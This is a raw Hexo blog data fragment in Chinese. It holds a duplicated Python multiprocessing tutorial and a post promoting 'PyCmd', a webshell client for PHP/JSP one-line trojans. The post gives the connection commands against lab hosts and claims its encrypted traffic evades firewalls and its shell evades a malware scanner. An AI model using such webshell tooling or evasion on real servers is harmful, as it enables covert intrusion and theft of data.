class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):     </div><div class=\"line\">    <span class=\"built_in\">return</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool = Pool(processes=10)</div><div class=\"line\">    result=[]</div><div class=\"line\">    <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000):</div><div class=\"line\">       <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">       for循环执行流程：</div><div class=\"line\">       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）</div><div class=\"line\">       （2）执行子进程（同时执行10个）</div><div class=\"line\">       '<span class=\"string\">''</span></div><div class=\"line\">       result.append(pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))<span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class=\"line\">    pool.join()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）</div><div class=\"line\">    '<span class=\"string\">''</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> result:</div><div class=\"line\">        <span class=\"built_in\">print</span> i.get()</div></pre></td></tr></table></figure>\n<p>错误写法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000):</div><div class=\"line\">   t=pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))</div><div class=\"line\">   <span class=\"built_in\">print</span> t.get()</div></pre></td></tr></table></figure>\n<p>说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。</p>\n<h4 id=\"高级用法（Pool）\"><a href=\"#高级用法（Pool）\" class=\"headerlink\" title=\"高级用法（Pool）\"></a>高级用法（Pool）</h4><p>目的：父进程实时获取子进程返回值，以此为标记结束所有进程。</p>\n<h5 id=\"实例（一）\"><a href=\"#实例（一）\" class=\"headerlink\" title=\"实例（一）\"></a>实例（一）</h5><p>执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\">import Queue</div><div class=\"line\">import time</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):</div><div class=\"line\">    time.sleep(0.001)</div><div class=\"line\">    <span class=\"keyword\">if</span> p==10000:</div><div class=\"line\">        <span class=\"built_in\">return</span> True</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"built_in\">return</span> False</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool = Pool(processes=10)</div><div class=\"line\">    q=Queue.Queue()</div><div class=\"line\">    <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000):</div><div class=\"line\">    \t<span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">    \t将子进程对象存入队列中。</div><div class=\"line\">    \t'<span class=\"string\">''</span></div><div class=\"line\">        q.put(pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))<span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。</div><div class=\"line\">    '<span class=\"string\">''</span></div><div class=\"line\">    <span class=\"keyword\">while</span> 1:</div><div class=\"line\">        <span class=\"keyword\">if</span> q.get().get():</div><div class=\"line\">            pool.terminate() <span class=\"comment\">#结束进程池中的所有子进程。</span></div><div class=\"line\">            <span class=\"built_in\">break</span></div><div class=\"line\">    pool.join()</div></pre></td></tr></table></figure>\n<p>说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。</p>\n<p>优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。</p>\n<p>不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。</p>\n<h5 id=\"实例（二）\"><a href=\"#实例（二）\" class=\"headerlink\" title=\"实例（二）\"></a>实例（二）</h5><p>多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\">import Queue</div><div class=\"line\">import threading</div><div class=\"line\">import time</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):</div><div class=\"line\">    time.sleep(0.001)</div><div class=\"line\">    <span class=\"keyword\">if</span> p==10000:</div><div class=\"line\">        <span class=\"built_in\">return</span> True</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"built_in\">return</span> False</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\"></div><div class=\"line\">    result=Queue.Queue() <span class=\"comment\">#队列</span></div><div class=\"line\">    pool = Pool()</div><div class=\"line\"></div><div class=\"line\">    def pool_th():</div><div class=\"line\">        <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000000): <span class=\"comment\">##这里需要创建执行的子进程非常多</span></div><div class=\"line\">            try:</div><div class=\"line\">                result.put(pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))</div><div class=\"line\">            except:</div><div class=\"line\">                <span class=\"built_in\">break</span></div><div class=\"line\"></div><div class=\"line\">    def result_th():</div><div class=\"line\">        <span class=\"keyword\">while</span> 1:</div><div class=\"line\">            a=result.get().get() <span class=\"comment\">#获取子进程返回值</span></div><div class=\"line\">            <span class=\"keyword\">if</span> a:</div><div class=\"line\">                pool.terminate() <span class=\"comment\">#结束所有子进程</span></div><div class=\"line\">                <span class=\"built_in\">break</span></div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</span></div><div class=\"line\">    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。</div><div class=\"line\">    '<span class=\"string\">''</span></div><div class=\"line\">    t1=threading.Thread(target=pool_th)</div><div class=\"line\">    t2=threading.Thread(target=result_th)</div><div class=\"line\">    t1.start()</div><div class=\"line\">    t2.start()</div><div class=\"line\">    t1.join()</div><div class=\"line\">    t2.join()</div><div class=\"line\"></div><div class=\"line\">    pool.join()</div></pre></td></tr></table></figure>\n<p>执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。</p>\n<p>优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。</p>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n","excerpt":"","more":"<p>　　在实际使用多进程的时候，可能需要获取到子进程运行的返回值。如果只是用来存储，则可以将返回值保存到一个数据结构中；如果需要判断此返回值，从而决定是否继续执行所有子进程，则会相对比较复杂。另外在Multiprocessing中，可以利用Process与Pool创建子进程，这两种用法在获取子进程返回值上的写法上也不相同。这篇中，我们直接上代码，分析多进程中获取子进程返回值的不同用法，以及优缺点。</p>\n<h4 id=\"初级用法（Pool）\"><a href=\"#初级用法（Pool）\" class=\"headerlink\" title=\"初级用法（Pool）\"></a>初级用法（Pool）</h4><p>目的：存储子进程返回值</p>\n<p>说明：如果只是单纯的存储子进程返回值，则可以使用Pool的apply_async异步进程池；当然也可以使用Process，用法与threading中的相同，这里只介绍前者。</p>\n<p>实例：当进程池中所有子进程执行完毕后，输出每个子进程的返回值。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):     </div><div class=\"line\">    <span class=\"built_in\">return</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool = Pool(processes=10)</div><div class=\"line\">    result=[]</div><div class=\"line\">    <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000):</div><div class=\"line\">       <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">       for循环执行流程：</div><div class=\"line\">       （1）添加子进程到pool，并将这个对象（子进程）添加到result这个列表中。（此时子进程并没有运行）</div><div class=\"line\">       （2）执行子进程（同时执行10个）</div><div class=\"line\">       '</span><span class=\"string\">''</span></div><div class=\"line\">       result.append(pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))<span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class=\"line\">    pool.join()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">    遍历result列表，取出子进程对象，访问get()方法，获取返回值。（此时所有子进程已执行完毕）</div><div class=\"line\">    '</span><span class=\"string\">''</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> result:</div><div class=\"line\">        <span class=\"built_in\">print</span> i.get()</div></pre></td></tr></table></figure>\n<p>错误写法：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000):</div><div class=\"line\">   t=pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))</div><div class=\"line\">   <span class=\"built_in\">print</span> t.get()</div></pre></td></tr></table></figure>\n<p>说明：这样会造成阻塞，因为get()方法只能等子进程运行完毕后才能调用成功，否则会一直阻塞等待。如果写在for循环内容，相当于变成了同步，执行效率将会非常低。</p>\n<h4 id=\"高级用法（Pool）\"><a href=\"#高级用法（Pool）\" class=\"headerlink\" title=\"高级用法（Pool）\"></a>高级用法（Pool）</h4><p>目的：父进程实时获取子进程返回值，以此为标记结束所有进程。</p>\n<h5 id=\"实例（一）\"><a href=\"#实例（一）\" class=\"headerlink\" title=\"实例（一）\"></a>实例（一）</h5><p>执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\">import Queue</div><div class=\"line\">import time</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):</div><div class=\"line\">    time.sleep(0.001)</div><div class=\"line\">    <span class=\"keyword\">if</span> p==10000:</div><div class=\"line\">        <span class=\"built_in\">return</span> True</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"built_in\">return</span> False</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\">    pool = Pool(processes=10)</div><div class=\"line\">    q=Queue.Queue()</div><div class=\"line\">    <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000):</div><div class=\"line\">    \t<span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">    \t将子进程对象存入队列中。</div><div class=\"line\">    \t'</span><span class=\"string\">''</span></div><div class=\"line\">        q.put(pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))<span class=\"comment\">#维持执行的进程总数为10，当一个进程执行完后添加新进程.       </span></div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">    因为这里使用的为pool.apply_async异步方法，因此子进程执行的过程中，父进程会执行while，获取返回值并校验。</div><div class=\"line\">    '</span><span class=\"string\">''</span></div><div class=\"line\">    <span class=\"keyword\">while</span> 1:</div><div class=\"line\">        <span class=\"keyword\">if</span> q.get().get():</div><div class=\"line\">            pool.terminate() <span class=\"comment\">#结束进程池中的所有子进程。</span></div><div class=\"line\">            <span class=\"built_in\">break</span></div><div class=\"line\">    pool.join()</div></pre></td></tr></table></figure>\n<p>说明：总共要执行50000个子进程（并发数量为10），当其中一个子进程返回True时，结束进程池。因为使用了apply_async为异步进程，因此在执行完for循环的添加子进程操作后（只是添加并没有执行完所有的子进程），可以直接执行while代码，实时判断子进程返回值是否有True，有的话结束所有进程。</p>\n<p>优点：不必等到所有子进程结束再结束程序，只要得到想要的结果就可以提前结束，节省资源。</p>\n<p>不足：当需要执行的子进程非常大时，不适用，因为for循环在添加子进程时，要花费很长的时间，虽然是异步，但是也需要等待for循环添加子进程操作结束才能执行while代码，因此会比较慢。</p>\n<h5 id=\"实例（二）\"><a href=\"#实例（二）\" class=\"headerlink\" title=\"实例（二）\"></a>实例（二）</h5><p>多线程+多进程，添加执行子进程的过程中，不断获取返回值并校验，如果返回值为True则结果所有进程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\">from multiprocessing import Pool</div><div class=\"line\">import Queue</div><div class=\"line\">import threading</div><div class=\"line\">import time</div><div class=\"line\"></div><div class=\"line\">def <span class=\"built_in\">test</span>(p):</div><div class=\"line\">    time.sleep(0.001)</div><div class=\"line\">    <span class=\"keyword\">if</span> p==10000:</div><div class=\"line\">        <span class=\"built_in\">return</span> True</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"built_in\">return</span> False</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</div><div class=\"line\"></div><div class=\"line\">    result=Queue.Queue() <span class=\"comment\">#队列</span></div><div class=\"line\">    pool = Pool()</div><div class=\"line\"></div><div class=\"line\">    def pool_th():</div><div class=\"line\">        <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> xrange(50000000): <span class=\"comment\">##这里需要创建执行的子进程非常多</span></div><div class=\"line\">            try:</div><div class=\"line\">                result.put(pool.apply_async(<span class=\"built_in\">test</span>, args=(i,)))</div><div class=\"line\">            except:</div><div class=\"line\">                <span class=\"built_in\">break</span></div><div class=\"line\"></div><div class=\"line\">    def result_th():</div><div class=\"line\">        <span class=\"keyword\">while</span> 1:</div><div class=\"line\">            a=result.get().get() <span class=\"comment\">#获取子进程返回值</span></div><div class=\"line\">            <span class=\"keyword\">if</span> a:</div><div class=\"line\">                pool.terminate() <span class=\"comment\">#结束所有子进程</span></div><div class=\"line\">                <span class=\"built_in\">break</span></div><div class=\"line\">    <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">    利用多线程，同时运行Pool函数创建执行子进程，以及运行获取子进程返回值函数。</div><div class=\"line\">    '</span><span class=\"string\">''</span></div><div class=\"line\">    t1=threading.Thread(target=pool_th)</div><div class=\"line\">    t2=threading.Thread(target=result_th)</div><div class=\"line\">    t1.start()</div><div class=\"line\">    t2.start()</div><div class=\"line\">    t1.join()</div><div class=\"line\">    t2.join()</div><div class=\"line\"></div><div class=\"line\">    pool.join()</div></pre></td></tr></table></figure>\n<p>执行流程：利用多线程，创建一个执行pool_th函数线程，一个执行result_th函数线程，pool_th函数用来添加进程池，开启进程执行功能函数并将子进程对象存入队列，而result_th()函数用来不停地从队列中取子进程对象，调用get（）方法获取返回值。等发现其中存在子进程的返回值为True时，结束所有进程，最后结束线程。</p>\n<p>优点：弥补了实例（一）的不足，即使for循环的子进程数量很多，也能提高性能，因为for循环与判断子进程返回值同时进行。</p>\n<p><hr><br>更多多进程用法，请移驾:    <a href=\"http://thief.one/2016/11/23/Python-multiprocessing/\">Python Multiprocessing</a></p>\n"},{"title":"PyCmd 加密隐形木马","date":"2016-09-18T08:35:58.000Z","comments":1,"_content":"\n　　之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神[caomei](https://github.com/8caomei)相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。\n<!-- more -->\n#### PyCmd使用\n\n　　我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。\n为了方便，我已经把服务端木马程序放到了服务器网站目录下：\n\n* php网站木马地址：http://10.0.3.13/test/p.php\n* jsp网站木马地址：http://192.168.10.149:8080/Test/1.jsp\n\n此时，运行PyCmd.py程序：\n\n```bash\npython PyCmd.py -u http://10.0.3.13/test/p.php -p test [--proxy]\n```\n或者\n```bash\npython PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p test [--proxy]\n```\n程序会自动判断输入的网站类型\n输入参数：\n* -h         查看帮助信息\n* -u         网站木马地址\n* -p         木马shell密码\n* --proxy    开启本地代理（方便调试）\n\n注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。\n\n#### PyCmd数据加密\n\nPyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。\n当执行cmd命令时，通过Fiddler抓包查看数据：\n![](/upload_image/20160918/002.png)\n![](/upload_image/20160918/003.png)\n\n#### PyCmd木马隐身\n\n用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀\n![](/upload_image/20160918/001.png)\n\n#### 工具下载\n\nPyCmd  [下载地址](https://github.com/tengzhangchao/PyCmd)\n","source":"_posts/PyCmd-加密隐形木马.md","raw":"---\ntitle: PyCmd 加密隐形木马\ndate: 2016-09-18 16:35:58\ncomments: true\ntags: 木马后门\ncategories: 安全工具\n---\n\n　　之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神[caomei](https://github.com/8caomei)相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。\n<!-- more -->\n#### PyCmd使用\n\n　　我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。\n为了方便，我已经把服务端木马程序放到了服务器网站目录下：\n\n* php网站木马地址：http://10.0.3.13/test/p.php\n* jsp网站木马地址：http://192.168.10.149:8080/Test/1.jsp\n\n此时，运行PyCmd.py程序：\n\n```bash\npython PyCmd.py -u http://10.0.3.13/test/p.php -p test [--proxy]\n```\n或者\n```bash\npython PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p test [--proxy]\n```\n程序会自动判断输入的网站类型\n输入参数：\n* -h         查看帮助信息\n* -u         网站木马地址\n* -p         木马shell密码\n* --proxy    开启本地代理（方便调试）\n\n注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。\n\n#### PyCmd数据加密\n\nPyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。\n当执行cmd命令时，通过Fiddler抓包查看数据：\n![](/upload_image/20160918/002.png)\n![](/upload_image/20160918/003.png)\n\n#### PyCmd木马隐身\n\n用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀\n![](/upload_image/20160918/001.png)\n\n#### 工具下载\n\nPyCmd  [下载地址](https://github.com/tengzhangchao/PyCmd)\n","slug":"PyCmd-加密隐形木马","published":1,"updated":"2017-02-14T01:12:03.336Z","layout":"post","photos":[],"link":"","_id":"ciz80dyaw000e3ofvkpxhmwwg","content":"<p>　　之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href=\"https://github.com/8caomei\" target=\"_blank\" rel=\"external\">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。<br><a id=\"more\"></a></p>\n<h4 id=\"PyCmd使用\"><a href=\"#PyCmd使用\" class=\"headerlink\" title=\"PyCmd使用\"></a>PyCmd使用</h4><p>　　我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。<br>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p>\n<ul>\n<li>php网站木马地址：<a href=\"http://10.0.3.13/test/p.php\" target=\"_blank\" rel=\"external\">http://10.0.3.13/test/p.php</a></li>\n<li>jsp网站木马地址：<a href=\"http://192.168.10.149:8080/Test/1.jsp\" target=\"_blank\" rel=\"external\">http://192.168.10.149:8080/Test/1.jsp</a></li>\n</ul>\n<p>此时，运行PyCmd.py程序：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python PyCmd.py -u http://10.0.3.13/<span class=\"built_in\">test</span>/p.php -p <span class=\"built_in\">test</span> [--proxy]</div></pre></td></tr></table></figure>\n<p>或者<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p <span class=\"built_in\">test</span> [--proxy]</div></pre></td></tr></table></figure></p>\n<p>程序会自动判断输入的网站类型<br>输入参数：</p>\n<ul>\n<li>-h         查看帮助信息</li>\n<li>-u         网站木马地址</li>\n<li>-p         木马shell密码</li>\n<li>–proxy    开启本地代理（方便调试）</li>\n</ul>\n<p>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p>\n<h4 id=\"PyCmd数据加密\"><a href=\"#PyCmd数据加密\" class=\"headerlink\" title=\"PyCmd数据加密\"></a>PyCmd数据加密</h4><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。<br>当执行cmd命令时，通过Fiddler抓包查看数据：<br><img src=\"/upload_image/20160918/002.png\" alt=\"\"><br><img src=\"/upload_image/20160918/003.png\" alt=\"\"></p>\n<h4 id=\"PyCmd木马隐身\"><a href=\"#PyCmd木马隐身\" class=\"headerlink\" title=\"PyCmd木马隐身\"></a>PyCmd木马隐身</h4><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀<br><img src=\"/upload_image/20160918/001.png\" alt=\"\"></p>\n<h4 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h4><p>PyCmd  <a href=\"https://github.com/tengzhangchao/PyCmd\" target=\"_blank\" rel=\"external\">下载地址</a></p>\n","excerpt":"<p>　　之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href=\"https://github.com/8caomei\">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。<br>","more":"</p>\n<h4 id=\"PyCmd使用\"><a href=\"#PyCmd使用\" class=\"headerlink\" title=\"PyCmd使用\"></a>PyCmd使用</h4><p>　　我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。<br>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p>\n<ul>\n<li>php网站木马地址：<a href=\"http://10.0.3.13/test/p.php\">http://10.0.3.13/test/p.php</a></li>\n<li>jsp网站木马地址：<a href=\"http://192.168.10.149:8080/Test/1.jsp\">http://192.168.10.149:8080/Test/1.jsp</a></li>\n</ul>\n<p>此时，运行PyCmd.py程序：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python PyCmd.py -u http://10.0.3.13/<span class=\"built_in\">test</span>/p.php -p <span class=\"built_in\">test</span> [--proxy]</div></pre></td></tr></table></figure>\n<p>或者<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p <span class=\"built_in\">test</span> [--proxy]</div></pre></td></tr></table></figure></p>\n<p>程序会自动判断输入的网站类型<br>输入参数：</p>\n<ul>\n<li>-h         查看帮助信息</li>\n<li>-u         网站木马地址</li>\n<li>-p         木马shell密码</li>\n<li>–proxy    开启本地代理（方便调试）</li>\n</ul>\n<p>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p>\n<h4 id=\"PyCmd数据加密\"><a 